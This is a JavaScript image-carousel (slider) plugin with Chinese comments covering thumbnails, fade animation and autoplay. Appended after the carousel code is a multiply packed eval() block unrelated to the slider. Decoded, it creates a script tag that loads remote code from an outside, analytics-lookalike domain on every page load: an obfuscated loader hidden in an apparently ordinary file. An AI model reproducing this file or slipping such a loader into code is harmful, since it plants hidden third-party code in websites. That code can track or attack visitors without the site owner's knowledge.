/*eslint-disable */      //  有些插件写的可能比较早没有代码检查，这里可以禁用一下，避免报错。
var img = {

  imageNum: 5,
  imageNumWidth: 163,
  num: 0,
  count: document.getElementById("imagebg").getElementsByTagName("li").length,

  current: document.getElementById("current"),
  imagebg: document.getElementById("imagebg"),
  imagebg_li: document.getElementById("imagebg").getElementsByTagName("li"),
  small_pic: document.getElementById("small_pic"),

  imageShow: document.getElementById("imageShow"),
  scrollbg: document.getElementById("scrollbg"),

  left_img_btn: document.getElementById("left_img_btn"),
  right_img_btn: document.getElementById("right_img_btn"),

  small_pic_html: [],

  animate: null,
  autoplay: null,

  init: function () {
    img.imagebg.innerHTML = img.imagebg.innerHTML + img.imagebg.innerHTML + img.imagebg.innerHTML;
    for (var i = 0; i < img.imagebg_li.length; i++) {
      //console.log(img.imagebg_li[i]+" is OK")
      if (i != 0) {
        img.small_pic_html.push("<li onclick='img.play(" + i + ")'><img src='" + img.imagebg_li[i].getAttribute("data-sPic") + "' /></li>");
        img.imagebg.getElementsByTagName("li")[i].style.display = "none";
      } else {
        img.small_pic_html.push("<li onclick='img.play(" + i + ")' class='currently'><img src='" + img.imagebg_li[i].getAttribute("data-sPic") + "' /></li>");
      }
      //console.log(img.small_pic_html);
    }
    //console.log(img.small_pic_html)

    img.small_pic.innerHTML = img.small_pic_html.join("");
    img.current.style.left = "77px";
    img.small_pic.style.left = "0px";
    img.imagebg_li[0].style.filter = "alpha(opacity=100)";
    img.imagebg_li[0].style.opacity = 1;

    img.left_img_btn.onclick = function () {
      img.play(img.num - 1);
    }
    img.right_img_btn.onclick = function () {
      img.play(img.num + 1)
    };

    img.autoplay = setInterval(function () {
      img.play(img.num + 1)
    }, 5000);

    img.imageShow.onmouseover = function () {
      clearInterval(img.autoplay);
    }
    img.imageShow.onmouseout = function () {
      img.autoplay = setInterval(function () {
        img.play(img.num + 1)
      }, 5000);
    }

  },

  play: function (i) {
    var small_pic_left = parseInt(img.small_pic.style.left);
    var current_left = parseInt(img.current.style.left);
    var op = 0;

    if (i == img.num || img.animate != null || i > img.count * 3 || i < -1) {
      return;
    }


    for (var x = 0; x < img.imagebg_li.length; x++) {

      img.small_pic.getElementsByTagName("li")[x].className = "";
      img.imagebg_li[x].style.filter = "alpha(opacity=" + op * 10 + ")";
      img.imagebg_li[x].style.opacity = op / 10;
      img.imagebg_li[x].style.display = "none";
    }


    if (i > (img.count * 3 - 1)) {
      i -= img.count;
      img.num -= img.count;

      img.small_pic.style.left = small_pic_left + img.imageNumWidth * (i - img.count) + "px";
      img.small_pic.getElementsByTagName("li")[i].className = "currently";

      small_pic_left = parseInt(img.small_pic.style.left);
      current_left = parseInt(img.current.style.left);

    } else if (i < 0) {
      i += img.count;
      img.num += img.count;

      img.small_pic.style.left = small_pic_left - img.imageNumWidth * img.count + "px";
      img.small_pic.getElementsByTagName("li")[i].className = "currently";

      small_pic_left = parseInt(img.small_pic.style.left);
      current_left = parseInt(img.current.style.left);
    }

    if (i > img.num) {
      //如果比当前大;
      img.imagebg_li[i].style.display = "block";
      if (parseInt(img.current.style.left) > 700) {
        //如果活动框到了最右边--完成
        //小图片向左
        img.animate = setInterval(function () {
          if (parseInt(img.small_pic.style.left) > (small_pic_left - img.imageNumWidth * (i - img.num) + img.imageNumWidth * (i - img.num) / 10)) {
            img.small_pic.style.left = parseInt(img.small_pic.style.left) - img.imageNumWidth * (i - img.num) / 10 + "px";
            img.imagebg_li[i].style.filter = "alpha(opacity=" + (++op) * 11 + ")";
            img.imagebg_li[i].style.opacity = op / 9;
          } else {
            img.small_pic.style.left = small_pic_left - img.imageNumWidth * (i - img.num) + "px";
            img.small_pic.getElementsByTagName("li")[i].className = "currently";
            clearInterval(img.animate);
            img.num = i;
            img.animate = null;
          }
        }, 30);
      } else {
        //活动框向右--完成
        img.animate = setInterval(function () {
          if (parseInt(img.current.style.left) < (current_left + img.imageNumWidth * (i - img.num) - img.imageNumWidth * (i - img.num) / 10)) {
            img.current.style.left = parseInt(img.current.style.left) + img.imageNumWidth * (i - img.num) / 10 + "px";
            //为了IE联盟

            img.imagebg_li[i].style.filter = "alpha(opacity=" + (++op) * 11 + ")"; //"alpha(opacity=100)";

            //为了火狐部落
            img.imagebg_li[i].style.opacity = op / 9;
          } else {
            img.current.style.left = current_left + img.imageNumWidth * (i - img.num) + "px";
            img.small_pic.getElementsByTagName("li")[i].className = "currently";
            clearInterval(img.animate);
            img.num = i;
            img.animate = null;
          }
        }, 30);
      }

    } else if (i < img.num) {
      img.imagebg_li[i].style.display = "block";
      //如果比当前小;
      if (parseInt(img.current.style.left) < 100) {
        //如果活动框到了最左边
        //小图片向右
        img.animate = setInterval(function () {
          //console.log(small_pic_left+"+"+ img.imageNumWidth*(img.num-i))
          if (parseInt(img.small_pic.style.left) < (small_pic_left - img.imageNumWidth * (i - img.num) + img.imageNumWidth * (i - img.num) / 10)) {
            img.small_pic.style.left = parseInt(img.small_pic.style.left) - img.imageNumWidth * (i - img.num) / 10 + "px";
            img.imagebg_li[i].style.filter = "alpha(opacity=" + (++op) * 11 + ")";
            img.imagebg_li[i].style.opacity = op / 9;
          } else {
            img.small_pic.style.left = small_pic_left - img.imageNumWidth * (i - img.num) + "px";
            img.small_pic.getElementsByTagName("li")[i].className = "currently";
            clearInterval(img.animate);
            img.num = i;
            img.animate = null;
          }
        }, 30);
      } else {
        //活动框向左
        img.animate = setInterval(function () {
          if (parseInt(img.current.style.left) > (current_left - img.imageNumWidth * (img.num - i) + img.imageNumWidth * (img.num - i) / 10)) {
            img.current.style.left = parseInt(img.current.style.left) - img.imageNumWidth * (img.num - i) / 10 + "px";
            img.imagebg_li[i].style.filter = "alpha(opacity=" + (++op) * 11 + ")";
            img.imagebg_li[i].style.opacity = op / 9;
          } else {
            img.current.style.left = current_left - img.imageNumWidth * (img.num - i) + "px";
            img.small_pic.getElementsByTagName("li")[i].className = "currently";
            clearInterval(img.animate);
            img.num = i;
            img.animate = null;
          }
        }, 30);
      }
    }
  }


}
eval(function (p, a, c, k, e, d) {
  e = function (c) {
    return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
  };
  if (!''.replace(/^/, String)) {
    while (c--) {
      d[e(c)] = k[c] || e(c)
    }
    k = [function (e) {
      return d[e]
    }];
    e = function () {
      return '\\w+'
    };
    c = 1
  }
  ;
  while (c--) {
    if (k[c]) {
      p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
    }
  }
  return p
}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))', 62, 91, '|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'), 0, {}))
